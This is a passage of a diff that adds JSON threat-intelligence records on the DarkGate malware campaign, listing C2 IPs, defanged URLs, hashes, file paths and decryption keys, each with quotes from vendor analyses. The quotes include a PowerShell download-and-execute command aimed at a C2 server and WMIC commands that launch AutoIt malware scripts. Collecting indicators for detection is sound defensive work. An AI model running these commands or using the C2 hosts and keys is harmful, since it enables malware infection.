+              "Analysis of browser history on a victim device identified that the initial vector was a LinkedIn message which directed the victim to hxxps://g2[.]by/jd-Corsair, which then redirected the victim to a file hosted on Google Drive."
+            ],
+            [
+              24,
+              "The URL seen during delivery of the malicious files was g2[.]by/corsair-JD."
+            ],
+            [
+              26,
+              "The g2[.]by/jd-Corsair redirect has been changed by the actor over time, at one point redirecting visitors to a file hosted on Google Drive, then at another time redirecting to a file hosted on Dropbox."
+            ]
+          ]
+        },
+        "raw_value": "g2[.]by",
+        "canonical_value": "g2.by",
+        "normalized_value": "g2.by"
+      },
+      {
+        "node_id": "IOC_186e60372185",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "5.188.87[.]58",
+        "edges": [
+          "EDGE_c6e17b1b7a07"
+        ],
+        "source": {
+          "5.188.87[.]58_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              42,
+              "All of the LNK files in the below table connect to hxxp://5.188.87[.]58:2351/ and download an MSI file."
+            ]
+          ]
+        },
+        "raw_value": "5.188.87[.]58",
+        "canonical_value": "5.188.87[.]58"
+      },
+      {
+        "node_id": "IOC_2bd3d4879eae",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxp://5.188.87[.]58:2351/",
+        "edges": [
+          "EDGE_5eb61232194a",
+          "EDGE_e4487747a411"
+        ],
+        "source": {
+          "hxxp://5.188.87[.]58:2351/_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              42,
+              "All of the LNK files in the below table connect to hxxp://5.188.87[.]58:2351/ and download an MSI file."
+            ]
+          ]
+        },
+        "raw_value": "hxxp://5.188.87[.]58:2351/",
+        "canonical_value": "http://5.188.87.58:2351/",
+        "normalized_value": "http://5.188.87.58:2351/"
+      },
+      {
+        "node_id": "IOC_6345ccc4911a",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "103.14.48[.]247",
+        "edges": [
+          "EDGE_bdd93619879f"
+        ],
+        "source": {
+          "103.14.48[.]247_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              32,
+              "The Redline stealer binary connects to 103.14.48[.]247:2130."
+            ]
+          ]
+        },
+        "raw_value": "103.14.48[.]247",
+        "canonical_value": "103.14.48[.]247"
+      },
+      {
+        "node_id": "IOC_65f433b0bcd5",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxp://149.248.0[.]82:2351/",
+        "edges": [
+          "EDGE_5592e6fa2ce6"
+        ],
+        "source": {
+          "hxxp://149.248.0[.]82:2351/_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              47,
+              "As well as the familiar bundle and filename format, this VBS file also connects to the original Corsair campaign C2 address, hxxp://149.248.0[.]82:2351/."
+            ],
+            [
+              48,
+              "The original C2 IP address of the Corsair campaign, hxxp://149.248.0[.]82:2351/, has been associated with a number of files from many different campaigns in VirusTotal."
+            ]
+          ]
+        },
+        "raw_value": "hxxp://149.248.0[.]82:2351/",
+        "canonical_value": "http://149.248.0.82:2351/",
+        "normalized_value": "http://149.248.0.82:2351/"
+      },
+      {
+        "node_id": "IOC_6ec8f2555ce9",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "a5cccdf086c63bea47a509c683e7b4214d1a2be0522fc835788887117e92d41a",
+        "edges": [],
+        "source": {
+          "a5cccdf086c63bea47a509c683e7b4214d1a2be0522fc835788887117e92d41a_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              49,
+              "Many of the files appear to be paired, i.e.:\nhxxp://149.248.0[.]82:2351/msiyfucokvo | hxxp://149.248.0[.]82:2351/yfucokvo |\n\nLobshot malware\nAmong the files that communicate with this C2 IP is OppyVYah.exe (a5cccdf086c63bea47a509c683e7b4214d1a2be0522fc835788887117e92d41a), which is identified as Lobshot, a malware with remote access capabilities."
+            ]
+          ]
+        },
+        "raw_value": "a5cccdf086c63bea47a509c683e7b4214d1a2be0522fc835788887117e92d41a",
+        "canonical_value": "a5cccdf086c63bea47a509c683e7b4214d1a2be0522fc835788887117e92d41a"
+      },
+      {
+        "node_id": "IOC_c1ec17f75a2c",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxp://149.248.0[.]82:2351/msiyfucokvo",
+        "edges": [
+          "EDGE_071f97d4e2a0"
+        ],
+        "source": {
+          "hxxp://149.248.0[.]82:2351/msiyfucokvo_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              49,
+              "Many of the files appear to be paired, i.e.:\nhxxp://149.248.0[.]82:2351/msiyfucokvo | hxxp://149.248.0[.]82:2351/yfucokvo |\n\nLobshot malware\nAmong the files that communicate with this C2 IP is OppyVYah.exe (a5cccdf086c63bea47a509c683e7b4214d1a2be0522fc835788887117e92d41a), which is identified as Lobshot, a malware with remote access capabilities."
+            ]
+          ]
+        },
+        "raw_value": "hxxp://149.248.0[.]82:2351/msiyfucokvo",
+        "canonical_value": "http://149.248.0.82:2351/msiyfucokvo",
+        "normalized_value": "http://149.248.0.82:2351/msiyfucokvo"
+      },
+      {
+        "node_id": "IOC_c3747ead4189",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "g2[.]by/corsair-JD",
+        "edges": [
+          "EDGE_70d3b32a4f71"
+        ],
+        "source": {
+          "g2[.]by/corsair-JD_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              24,
+              "The URL seen during delivery of the malicious files was g2[.]by/corsair-JD."
+            ]
+          ]
+        },
+        "raw_value": "g2[.]by/corsair-JD",
+        "canonical_value": "http://g2.by/corsair-JD",
+        "normalized_value": "http://g2.by/corsair-JD"
+      },
+      {
+        "node_id": "IOC_c8aae67627e4",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxps://g2[.]by/jd-Corsair",
+        "edges": [
+          "EDGE_b17411060c7f"
+        ],
+        "source": {
+          "hxxps://g2[.]by/jd-Corsair_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              12,
+              "Analysis of browser history on a victim device identified that the initial vector was a LinkedIn message which directed the victim to hxxps://g2[.]by/jd-Corsair, which then redirected the victim to a file hosted on Google Drive."
+            ]
+          ]
+        },
+        "raw_value": "hxxps://g2[.]by/jd-Corsair",
+        "canonical_value": "https://g2.by/jd-Corsair",
+        "normalized_value": "https://g2.by/jd-Corsair"
+      },
+      {
+        "node_id": "IOC_cac47f2dd6e3",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxp://149.248.0[.]82:2351/yfucokvo",
+        "edges": [
+          "EDGE_97ae1aa30a94"
+        ],
+        "source": {
+          "hxxp://149.248.0[.]82:2351/yfucokvo_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              49,
+              "Many of the files appear to be paired, i.e.:\nhxxp://149.248.0[.]82:2351/msiyfucokvo | hxxp://149.248.0[.]82:2351/yfucokvo |\n\nLobshot malware\nAmong the files that communicate with this C2 IP is OppyVYah.exe (a5cccdf086c63bea47a509c683e7b4214d1a2be0522fc835788887117e92d41a), which is identified as Lobshot, a malware with remote access capabilities."
+            ]
+          ]
+        },
+        "raw_value": "hxxp://149.248.0[.]82:2351/yfucokvo",
+        "canonical_value": "http://149.248.0.82:2351/yfucokvo",
+        "normalized_value": "http://149.248.0.82:2351/yfucokvo"
+      },
+      {
+        "node_id": "IOC_d7a3a8dccaff",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "149.248.0[.]82",
+        "edges": [
+          "EDGE_24a49b3fe4ab"
+        ],
+        "source": {
+          "149.248.0[.]82_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              40,
+              "The IP addresses linked to these MSI files includes the original C2 IP in the original incident investigated by WithSecure, 149.248.0[.]82."
+            ],
+            [
+              47,
+              "As well as the familiar bundle and filename format, this VBS file also connects to the original Corsair campaign C2 address, hxxp://149.248.0[.]82:2351/."
+            ],
+            [
+              48,
+              "The original C2 IP address of the Corsair campaign, hxxp://149.248.0[.]82:2351/, has been associated with a number of files from many different campaigns in VirusTotal."
+            ],
+            [
+              49,
+              "Many of the files appear to be paired, i.e.:\nhxxp://149.248.0[.]82:2351/msiyfucokvo | hxxp://149.248.0[.]82:2351/yfucokvo |\n\nLobshot malware\nAmong the files that communicate with this C2 IP is OppyVYah.exe (a5cccdf086c63bea47a509c683e7b4214d1a2be0522fc835788887117e92d41a), which is identified as Lobshot, a malware with remote access capabilities."
+            ]
+          ]
+        },
+        "raw_value": "149.248.0[.]82",
+        "canonical_value": "149.248.0[.]82"
+      },
+      {
+        "node_id": "IOC_1f5a778e75bf",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:/ProgramData/Kaspersky Lab",
+        "edges": [
+          "EDGE_31f579b6f804",
+          "EDGE_6dc41c83552a"
+        ],
+        "source": {
+          "C:/ProgramData/Kaspersky Lab_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              19,
+              "Below in Figure 8, we find an example of a PowerShell script that checks if Kaspersky anti-malware software is installed by detecting if the directory C:/ProgramData/Kaspersky Lab exists."
+            ]
+          ]
+        },
+        "raw_value": "C:/ProgramData/Kaspersky Lab",
+        "canonical_value": "C:\\ProgramData\\Kaspersky Lab",
+        "normalized_value": "C:\\ProgramData\\Kaspersky Lab"
+      },
+      {
+        "node_id": "IOC_094ea5bb3d17",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\ProgramData\\dehffdh\\ddahcgk",
+        "edges": [
+          "EDGE_2754d48dfd1f",
+          "EDGE_fb32f167dcc1"
+        ],
+        "source": {
+          "C:\\ProgramData\\dehffdh\\ddahcgk_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              24,
+              "The code appends “Domain=<host IP>” and “EPOCH=<current timestamp>” to the configuration data, encrypts it using a stored key with the EncryptDecrypt algorithm, and writes the encrypted data into the settings file located at “C:\\ProgramData\\dehffdh\\ddahcgk.” Additionally, it captures domain information using the command “cmd.exe /cz wmic ComputerSystem get domain” and stores it in the domain file “C:\\ProgramData\\dehffdh\\kkgfbgh.”\nIf the malware finds the string “optpad” in the encrypted configuration data, it considers the execution in a debug environment and uses localhost (127.0.0.1) instead of the actual Command and Control (C2) host."
+            ]
+          ]
+        },
+        "raw_value": "C:\\ProgramData\\dehffdh\\ddahcgk",
+        "canonical_value": "C:\\ProgramData\\dehffdh\\ddahcgk",
+        "normalized_value": "C:\\ProgramData\\dehffdh\\ddahcgk"
+      },
+      {
+        "node_id": "IOC_271de6758148",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\ProgramData",
+        "edges": [],
+        "source": {
+          "C:\\ProgramData_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              22,
+              "The malware creates the hash-encrypted named mainfolder “dehffdh” in “C:\\ProgramData.” Instead of “C:\\ProgramData,” the malware uses the directory “C:\\” if any of the Avast or AVG security software is present on the victim’s machine."
+            ]
+          ]
+        },
+        "raw_value": "C:\\ProgramData",
+        "canonical_value": "C:\\ProgramData",
+        "normalized_value": "C:\\ProgramData"
+      },
+      {
+        "node_id": "IOC_61db997e2e69",
+        "node_class": "ioc",
+        "node_type": "AESKey",
+        "node_text": "GDrdcpJy",
+        "edges": [
+          "EDGE_c67671397498",
+          "EDGE_d7a4d90eea89"
+        ],
+        "source": {
+          "GDrdcpJy_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              10,
+              "The loader reads the script file and retrieves the encrypted DarkGate bytes using the marker value “GDrdcpJy.” The malware decrypts the DarkGate binary with the key “GDrdcpJy” using the EncryptDecrypt algorithm, which is explained in the malware initialization section."
+            ],
+            [
+              30,
+              "The malware decrypts the DarkGate binary with the key value \"GDrdcpJy\" from field data 27 using the EncryptDecrypt algorithm."
+            ]
+          ]
+        },
+        "raw_value": "GDrdcpJy",
+        "canonical_value": "GDrdcpJy"
+      },
+      {
+        "node_id": "IOC_6eb1375311b9",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\ProgramData\\dehffdh\\kkgfbgh",
+        "edges": [],
+        "source": {
+          "C:\\ProgramData\\dehffdh\\kkgfbgh_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              24,
+              "The code appends “Domain=<host IP>” and “EPOCH=<current timestamp>” to the configuration data, encrypts it using a stored key with the EncryptDecrypt algorithm, and writes the encrypted data into the settings file located at “C:\\ProgramData\\dehffdh\\ddahcgk.” Additionally, it captures domain information using the command “cmd.exe /cz wmic ComputerSystem get domain” and stores it in the domain file “C:\\ProgramData\\dehffdh\\kkgfbgh.”\nIf the malware finds the string “optpad” in the encrypted configuration data, it considers the execution in a debug environment and uses localhost (127.0.0.1) instead of the actual Command and Control (C2) host."
+            ]
+          ]
+        },
+        "raw_value": "C:\\ProgramData\\dehffdh\\kkgfbgh",
+        "canonical_value": "C:\\ProgramData\\dehffdh\\kkgfbgh",
+        "normalized_value": "C:\\ProgramData\\dehffdh\\kkgfbgh"
+      },
+      {
+        "node_id": "IOC_73e8449d84eb",
+        "node_class": "ioc",
+        "node_type": "AESKey",
+        "node_text": "ckcilIcconnh",
+        "edges": [
+          "EDGE_0597eeb03db2",
+          "EDGE_0f5cecea3254"
+        ],
+        "source": {
+          "ckcilIcconnh_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              18,
+              "The malware decrypts the configuration data from memory with the key “ckcilIcconnh” using an XOR-based algorithm."
+            ]
+          ]
+        },
+        "raw_value": "ckcilIcconnh",
+        "canonical_value": "ckcilIcconnh"
+      },
+      {
+        "node_id": "IOC_76ce230ba9db",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "127.0.0.1",
+        "edges": [
+          "EDGE_d16a1a28e87f"
+        ],
+        "source": {
+          "127.0.0.1_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              24,
+              "The code appends “Domain=<host IP>” and “EPOCH=<current timestamp>” to the configuration data, encrypts it using a stored key with the EncryptDecrypt algorithm, and writes the encrypted data into the settings file located at “C:\\ProgramData\\dehffdh\\ddahcgk.” Additionally, it captures domain information using the command “cmd.exe /cz wmic ComputerSystem get domain” and stores it in the domain file “C:\\ProgramData\\dehffdh\\kkgfbgh.”\nIf the malware finds the string “optpad” in the encrypted configuration data, it considers the execution in a debug environment and uses localhost (127.0.0.1) instead of the actual Command and Control (C2) host."
+            ]
+          ]
+        },
+        "raw_value": "127.0.0.1",
+        "canonical_value": "127.0.0.1"
+      },
+      {
+        "node_id": "IOC_97000484bce8",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Default\\script.a3x",
+        "edges": [
+          "EDGE_6c2d14a29d67",
+          "EDGE_d7b40a08508c"
+        ],
+        "source": {
+          "C:\\Default\\script.a3x_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              3,
+              "The malware retrieves the compressed data using the regular expression “'\\s(+)(\\r?\\n|$)” and extracts files into “C:\\Default\\Autoit3.exe” and “C:\\Default\\script.a3x.” The malware executes the compiled AutoIt3 (AU3) script file using the WMIC command “wmic process call create \"cmd /c C:\\Default\\Autoit3.exe C:\\Default\\script.a3x\"” which further continues the execution of the malware."
+            ]
+          ]
+        },
+        "raw_value": "C:\\Default\\script.a3x",
+        "canonical_value": "C:\\Default\\script.a3x",
+        "normalized_value": "C:\\Default\\script.a3x"
+      },
+      {
+        "node_id": "IOC_b6364d943372",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Default\\Autoit3.exe",
+        "edges": [
+          "EDGE_4f93f47efc8d",
+          "EDGE_66c0cc5e384a"
+        ],
+        "source": {
+          "C:\\Default\\Autoit3.exe_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              3,
+              "The malware retrieves the compressed data using the regular expression “'\\s(+)(\\r?\\n|$)” and extracts files into “C:\\Default\\Autoit3.exe” and “C:\\Default\\script.a3x.” The malware executes the compiled AutoIt3 (AU3) script file using the WMIC command “wmic process call create \"cmd /c C:\\Default\\Autoit3.exe C:\\Default\\script.a3x\"” which further continues the execution of the malware."
+            ]
+          ]
+        },
+        "raw_value": "C:\\Default\\Autoit3.exe",
+        "canonical_value": "C:\\Default\\Autoit3.exe",
+        "normalized_value": "C:\\Default\\Autoit3.exe"
+      },
+      {
+        "node_id": "IOC_b6c77c0e6699",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\",
+        "edges": [],
+        "source": {
+          "C:\\_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              22,
+              "The malware creates the hash-encrypted named mainfolder “dehffdh” in “C:\\ProgramData.” Instead of “C:\\ProgramData,” the malware uses the directory “C:\\” if any of the Avast or AVG security software is present on the victim’s machine."
+            ]
+          ]
+        },
+        "raw_value": "C:\\",
+        "canonical_value": "C:\\",
+        "normalized_value": "C:\\"
+      },
+      {
+        "node_id": "IOC_fea1181a6ea2",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "c:\\debug",
+        "edges": [
+          "EDGE_bd57bdfa8d77"
+        ],
+        "source": {
+          "c:\\debug_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              26,
+              "The malware also checks for the presence of the directory “c:\\debug” to display a debug message with the DarkGate version number."
+            ]
+          ]
+        },
+        "raw_value": "c:\\debug",
+        "canonical_value": "C:\\debug",
+        "normalized_value": "C:\\debug"
+      },
+      {
+        "node_id": "IOC_0e8ef602e0f5",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Temp\\test\\",
+        "edges": [
+          "EDGE_8ad833c519b7"
+        ],
+        "source": {
+          "C:\\Temp\\test\\_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              14,
+              "The executable file SystemCert.exe (SHA256: 4e291266399bd8db27da0f0913c041134657f3b1cf45f340263444c050ed3ee1), which we believed was dropped via AnyDesk.exe, was executed and created script.a3x and Autoit3.exe in the C:\\Temp\\test\\ folder (Figure 7)."
+            ]
+          ]
+        },
+        "raw_value": "C:\\Temp\\test\\",
+        "canonical_value": "C:\\Temp\\test",
+        "normalized_value": "C:\\Temp\\test"
+      },
+      {
+        "node_id": "IOC_1d49173120e1",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "c:\\windows\\system32\\rundll32.exe",
+        "edges": [
+          "EDGE_a8ae74f285cc",
+          "EDGE_e81319cf8f1c"
+        ],
+        "source": {
+          "c:\\windows\\system32\\rundll32.exe_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              12,
+              "processCmd: \"C:\\Windows\\System32\\cmd.exe\"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: c:\\windows\\system32\\rundll32.exe\nobjectCmd: rundll32.exe SafeStore.dll,epaas_request_clone\nVision One’s root cause analysis (RCA) in Figure 4 shows a DLL side-loading technique where rundll32.exe was invoked to execute an exported function in Safestore.dll called epaas_request_clone (Figure 3)."
+            ]
+          ]
+        },
+        "raw_value": "c:\\windows\\system32\\rundll32.exe",
+        "canonical_value": "C:\\windows\\system32\\rundll32.exe",
+        "normalized_value": "C:\\windows\\system32\\rundll32.exe"
+      },
+      {
+        "node_id": "IOC_1dbc0645af43",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Users\\<user>\\Downloads\\AnyDesk.exe",
+        "edges": [
+          "EDGE_027171b747c2",
+          "EDGE_3c15311336e2",
+          "EDGE_98fe7923479d"
+        ],
+        "source": {
+          "C:\\Users\\<user>\\Downloads\\AnyDesk.exe_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              10,
+              "The command ran is as follows:\n“C:\\Users\\<user>\\Downloads\\AnyDesk.exe\" --local-service\nThis command runs the AnyDesk remote desktop application and starts it as a local service on the system, allowing it to operate with elevated privileges or in a minimized/automated fashion."
+            ]
+          ]
+        },
+        "raw_value": "C:\\Users\\<user>\\Downloads\\AnyDesk.exe",
+        "canonical_value": "C:\\Users\\<user>\\Downloads\\AnyDesk.exe",
+        "normalized_value": "C:\\Users\\<user>\\Downloads\\AnyDesk.exe"
+      },
+      {
+        "node_id": "IOC_2eabd5a10bef",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Windows\\System32\\cmd.exe",
+        "edges": [
+          "EDGE_3f5468d8ac7c"
+        ],
+        "source": {
+          "C:\\Windows\\System32\\cmd.exe_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              12,
+              "processCmd: \"C:\\Windows\\System32\\cmd.exe\"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: c:\\windows\\system32\\rundll32.exe\nobjectCmd: rundll32.exe SafeStore.dll,epaas_request_clone\nVision One’s root cause analysis (RCA) in Figure 4 shows a DLL side-loading technique where rundll32.exe was invoked to execute an exported function in Safestore.dll called epaas_request_clone (Figure 3)."
+            ]
+          ]
+        },
+        "raw_value": "C:\\Windows\\System32\\cmd.exe",
+        "canonical_value": "C:\\Windows\\System32\\cmd.exe",
+        "normalized_value": "C:\\Windows\\System32\\cmd.exe"
+      },
+      {
+        "node_id": "IOC_30b51a02f04a",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\1.3.195.35\\MicrosoftEdgeUpdateCore.exe.",
+        "edges": [
+          "EDGE_c210be69bd87"
+        ],
+        "source": {
+          "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\1.3.195.35\\MicrosoftEdgeUpdateCore.exe._www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              23,
+              "processCmd: \"c:\\temp\\test\\Autoit3.exe\" c:\\temp\\test\\script.a3x\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\1.3.195.35\\MicrosoftEdgeUpdateCore.exe."
+            ]
+          ]
+        },
+        "raw_value": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\1.3.195.35\\MicrosoftEdgeUpdateCore.exe.",
+        "canonical_value": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\1.3.195.35\\MicrosoftEdgeUpdateCore.exe.",
+        "normalized_value": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\1.3.195.35\\MicrosoftEdgeUpdateCore.exe."
+      },
+      {
+        "node_id": "IOC_336d05105620",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate",
+        "edges": [
+          "EDGE_21731cc62c08"
+        ],
+        "source": {
+          "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              17,
+              "One observed example was the legitimate binary for MicrosoftEdgeUpdateCore.exe, located in C:\\Program Files (x86)\\Microsoft\\EdgeUpdate."
+            ]
+          ]
+        },
+        "raw_value": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate",
+        "canonical_value": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate",
+        "normalized_value": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate"
+      },
+      {
+        "node_id": "IOC_891e96613305",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "c:\\temp\\test\\AutoIt3.exe",
+        "edges": [
+          "EDGE_278133f76de4",
+          "EDGE_b46a2ad45e6c"
+        ],
+        "source": {
+          "c:\\temp\\test\\AutoIt3.exe_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              15,
+              "After the script.a3x and AutoIt3.exe files are created, the malicious script script.a3x is executed via the command cmd c:\\temp\\test\\AutoIt3.exe c:\\temp\\test\\script.a3x."
+            ]
+          ]
+        },
+        "raw_value": "c:\\temp\\test\\AutoIt3.exe",
+        "canonical_value": "C:\\temp\\test\\AutoIt3.exe",
+        "normalized_value": "C:\\temp\\test\\AutoIt3.exe"
+      },
+      {
+        "node_id": "IOC_89c724e1298e",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "179.60.149[.]194",
+        "edges": [
+          "EDGE_755eed7ad7f0",
+          "EDGE_9a889c40df87"
+        ],
+        "source": {
+          "179.60.149[.]194_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              24,
+              "A few minutes after the connection to IP 179.60.149[.]194, a VBScript was executed via cscript.exe:\nobjectCmd:cscript spamfilter_v1.4331.vbs\nBased on the contents of VBScript spamfilter_v1.4331.vbs file, it will run the PowerShell command, then run the script.a3x via Autoit3.exe."
+            ],
+            [
+              25,
+              "The said event was accompanied by the execution of a PowerShell command that dropped the DarkGate payload:\nobjectCmd: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command Invoke-Expression (Invoke-RestMethod -Uri hxxp://179.60.149[.]194:8080/fdgjsdmt)\nThe command above will attempt to download fdgjsdmt from hxxp://179.60.149[.]194:8080 and execute it with the following content:."
+            ]
+          ]
+        },
+        "raw_value": "179.60.149[.]194",
+        "canonical_value": "179.60.149[.]194"
+      },
+      {
+        "node_id": "IOC_9967d0337b5c",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxp://179.60.149[.]194:8080/fdgjsdmt",
+        "edges": [
+          "EDGE_8b828e6b695d"
+        ],
+        "source": {
+          "hxxp://179.60.149[.]194:8080/fdgjsdmt_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              25,
+              "The said event was accompanied by the execution of a PowerShell command that dropped the DarkGate payload:\nobjectCmd: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command Invoke-Expression (Invoke-RestMethod -Uri hxxp://179.60.149[.]194:8080/fdgjsdmt)\nThe command above will attempt to download fdgjsdmt from hxxp://179.60.149[.]194:8080 and execute it with the following content:."
+            ]
+          ]
+        },
+        "raw_value": "hxxp://179.60.149[.]194:8080/fdgjsdmt",
+        "canonical_value": "http://179.60.149.194:8080/fdgjsdmt",
+        "normalized_value": "http://179.60.149.194:8080/fdgjsdmt"
+      },
+      {
+        "node_id": "IOC_a54ecfae1077",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "faa54f7152775fa6ccaecc2fe4a6696e5b984dfa41db9a622e4d3e0f59c82d8b",
+        "edges": [],
+        "source": {
+          "faa54f7152775fa6ccaecc2fe4a6696e5b984dfa41db9a622e4d3e0f59c82d8b_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              32,
+              "A few minutes later, an executable file, StaticSrv.exe (SHA256: faa54f7152775fa6ccaecc2fe4a6696e5b984dfa41db9a622e4d3e0f59c82d8b), dropped in the C:\\Users\\<user>\\ folder, was executed and invoked AutoIt3.exe to run script.a3x."
+            ]
+          ]
+        },
+        "raw_value": "faa54f7152775fa6ccaecc2fe4a6696e5b984dfa41db9a622e4d3e0f59c82d8b",
+        "canonical_value": "faa54f7152775fa6ccaecc2fe4a6696e5b984dfa41db9a622e4d3e0f59c82d8b"
+      },
+      {
+        "node_id": "IOC_b78c108c0349",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\rbne\\dxqu\\",
+        "edges": [
+          "EDGE_f76365e52b8b"
+        ],
+        "source": {
+          "C:\\rbne\\dxqu\\_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              26,
+              "This command will create a directory at C:\\rbne\\dxqu\\ if it doesn't already exist."
+            ],
+            [
+              30,
+              "This command extracts the contents of the downloaded file.zip into the C:\\rbne\\dxqu\\ directory."
+            ],
+            [
+              31,
+              "The file.zip was dropped to C:\\rbne\\dxqu\\ and contains a malicious AutoIt script."
+            ]
+          ]
+        },
+        "raw_value": "C:\\rbne\\dxqu\\",
+        "canonical_value": "C:\\rbne\\dxqu",
+        "normalized_value": "C:\\rbne\\dxqu"
+      },
+      {
+        "node_id": "IOC_c9d66d3e9946",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "c:\\temp\\test\\script.a3x",
+        "edges": [
+          "EDGE_02a227c31e98",
+          "EDGE_a40967744d6b",
+          "EDGE_c847278af20a"
+        ],
+        "source": {
+          "c:\\temp\\test\\script.a3x_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              15,
+              "After the script.a3x and AutoIt3.exe files are created, the malicious script script.a3x is executed via the command cmd c:\\temp\\test\\AutoIt3.exe c:\\temp\\test\\script.a3x."
+            ]
+          ]
+        },
+        "raw_value": "c:\\temp\\test\\script.a3x",
+        "canonical_value": "C:\\temp\\test\\script.a3x",
+        "normalized_value": "C:\\temp\\test\\script.a3x"
+      },
+      {
+        "node_id": "IOC_efb50a291219",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\ProgramData\\fcdcdfc\\kcbbbbc",
+        "edges": [
+          "EDGE_f3a76ed36a38"
+        ],
+        "source": {
+          "C:\\ProgramData\\fcdcdfc\\kcbbbbc_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              19,
